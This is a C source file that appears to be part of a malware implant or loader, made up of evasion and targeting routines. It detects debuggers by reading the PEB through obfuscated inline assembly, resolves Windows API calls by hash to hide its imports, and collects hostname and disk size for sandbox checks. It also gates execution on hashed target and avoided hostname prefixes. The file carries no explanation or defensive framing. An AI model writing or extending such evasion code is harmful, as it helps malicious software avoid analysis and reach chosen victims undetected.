#include "definitions.h"


uint8_t is_being_debugged() {
    PVOID pebAddress;
    uint8_t beingDebugged = 0;
    #ifdef _WIN64
        __asm__ (
            "mov $0xae, %%rax\n\t"
            "xor %%rdx, %%rdx\n\t"
            "xor $0xce, %%rax\n\t"
            "mov %%gs:(%%rax), %%rax\n\t"
            "inc %%rax\n\t"
            "inc %%rax\n\t"
            "mov (%%rax), %[result]\n\t"
            : [result] "=r" (beingDebugged)
            : 
            : "rax", "rdx", "memory"
        );
    #endif
    // 32 bits -> 0
    return beingDebugged;
}

const char* get_hostname(HMODULE hKernel32dll) {
    static char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameFunc _GetComputerName = (GetComputerNameFunc)CustomGetProcAdress(hKernel32dll, GET_COMPUTER_NAME_HASH);
    if (_GetComputerName(computerName, &size)) {
        return computerName;
    } else {
        return "Error";
    }
}

int get_disk_size(HMODULE hKernel32dll) {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    int totalSizeGB = -11;
    GetDiskFreeSpaceExFuncA _GetDiskFreeSpace = (GetDiskFreeSpaceExFuncA)CustomGetProcAdress(hKernel32dll, GET_DISK_FREE_SPACE_HASH);
    if (_GetDiskFreeSpace("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        totalSizeGB = (int)((totalBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));
        // int freeSizeGB = (int)((totalFreeBytes.QuadPart + (1024LL * 1024 * 1024 / 2)) / (1024LL * 1024 * 1024));        
    }
    return totalSizeGB;
}

// char* c() {
//     // not working
//     // char country[256];
//     // if (GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, ,country, sizeof(country)) == 0) {
//     //     DWORD error = GetLastError();
//     //     printf("Erreur lors de la récupération du pays. Code d'erreur : %lu\n", error);
//     // }
//     return "FR";
// }

// void v() {

// }

unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
    unsigned int hash = 0;
    for (size_t i = 0; i < strlen(str); i++) {
        if (is_rotation_right) {
            hash = (hash >> rotation_value) | (hash << (32 - rotation_value));
        } else {
            hash = (hash << rotation_value) | (hash >> (32 - rotation_value));
        }
        hash += str[i];
    }
    return hash;
}

bool is_target_hostname(const char* hostname) {
    if (TARGET_HOSTNAME_PREFIX_HASH.value == 0) {
        return true;
    }
    unsigned int current_hash = 0;
    for (size_t i = 0; hostname[i] != '\0'; i++) {
        current_hash = RO(hostname, TARGET_HOSTNAME_PREFIX_HASH.rotation_value, TARGET_HOSTNAME_PREFIX_HASH.is_rotation_right);
        
        if (current_hash == TARGET_HOSTNAME_PREFIX_HASH.value) {
            return true;
        }
    }
    return false;
}


bool is_avoided_hostname(const char* hostname) {
    ObjHash tmp_hash;
    char buffer[256];
    unsigned int current_hash;

    for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
        tmp_hash = AVOIDED_HOSTNAME_PREFIX_HASHES[i];

        for (size_t j = 0; hostname[j] != '\0' && j < sizeof(buffer) - 1; j++) {
            buffer[j] = hostname[j];
            buffer[j + 1] = '\0';

            current_hash = RO(buffer, tmp_hash.rotation_value, tmp_hash.is_rotation_right);

            if (current_hash == tmp_hash.value) {
                return true;
            }
        }
    }
    return false;
}


bool is_valid_hostname(const char* hostname) {
    return (is_target_hostname(hostname) && !is_avoided_hostname(hostname));
}